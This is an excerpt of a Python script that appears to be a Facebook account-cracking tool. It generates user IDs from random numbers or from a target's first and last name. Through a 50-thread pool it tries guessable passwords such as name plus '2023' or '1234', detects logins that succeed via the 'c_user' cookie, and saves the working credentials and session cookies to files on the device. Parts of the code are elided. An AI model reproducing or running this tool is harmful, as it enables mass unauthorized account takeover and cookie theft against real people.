...
def i():
        os.system("clear")
        print(logo)
        print(" [01] Random Number Clone [FREE] ")
        print(" [02] Random Number Clone [MBASIC] ")
        print(" [03] Random Email Clone ")
        print(" [00] Exit")
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        fuck =input(" [?] Choose : ")
        if fuck in ["1", "01"]:
...
def xr():
    ...
    print(' \033[1;91m[\033[1;92m🤖\033[1;91m]\033[1;92m Ids saved in ANONYMOUS/ok.txt,ANONYMOUS/cp.txt')
    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
def r():
    user=[]
    twf =[]
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        for love in user:
            ...
            for Eman in RimonID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rrcrack,uid,pwx,tl)
    print('\n\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
    print(' \033[1;91m[\033[1;92m✔😏\033[1;91m]\033[1;92m Crack process has been completed')
    print(' \033[1;91m[\033[1;92m🤣\033[1;91m]\033[1;92m Ids saved in ANONYMOUS/ok.txt,ANONYMOUS/cp.txt')
    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
...
def gml():
    ...
    os.system('clear')
    print(logo)
    first = input(' [?] Target fast name : ')
    os.system('clear')
    print(logo)
    last = input(' [?] Target last name :  ')
    os.system('clear')
    print(logo)
    ...
    with ThreadPool(max_workers=50) as yaari:
        ...
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = first+last+guru+doamin
            pwx = [first+'2023',first+last,first+'1234',last+'12345']
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print("\033[1;35m ")
                print('PASS > ' +ps+ '')
                print('YOUR USER 👽AGENT > ' +pro+ '')
                
                print("\033[1;32m ")
                print('YOUR  🍪 > ' +coki+ '')
                open('/sdcard/free-ok.txt', 'a').write( uid+' | '+ps+'\n')
                open('/sdcard/fb-cok.txt', 'a').write( coki+'\n')
                oks.append(cid)
                break
                ...
                print("\033[1;32m ")
                print('YOUR USER 💩  AGENT > ' +pro+ '')              
                open('/sdcard/free-fb-cp.txt', 'a').write( uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r \033[1;91m[\033[1;97mANONYMOUS\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/mbasic-cp.txt', 'a').write( uid+'  '+ps+'')
                cps.append(cid)
                break
            else:
                continue
